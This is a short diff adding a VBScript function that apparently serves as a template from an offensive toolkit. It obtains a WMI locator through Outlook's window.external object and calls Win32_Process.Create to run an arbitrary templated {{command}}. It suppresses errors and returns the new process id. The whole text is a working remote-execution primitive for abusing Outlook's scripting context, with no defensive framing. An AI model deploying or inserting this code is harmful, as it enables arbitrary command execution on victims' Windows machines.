@@ -1,0 +1,9 @@
+Function Execute_WMICommand()
+    On Error Resume Next
+    Set objLocator = window.external.OutlookApplication.CreateObject("WbemScripting.SWbemLocator")
+    Set objService = objLocator.ConnectServer(".", "root\cimv2")
+    Set objConfig = objService.Get("Win32_ProcessStartup").SpawnInstance_()
+    Set objProcess = objService.Get("Win32_Process")
+    objProcess.Create {{command}}, Null, objConfig, varProcessId
+    Execute_WMICommand = "Command executed: " & {{command}} & vbCrLf & "Process id new process: " & varProcessId
+End Function
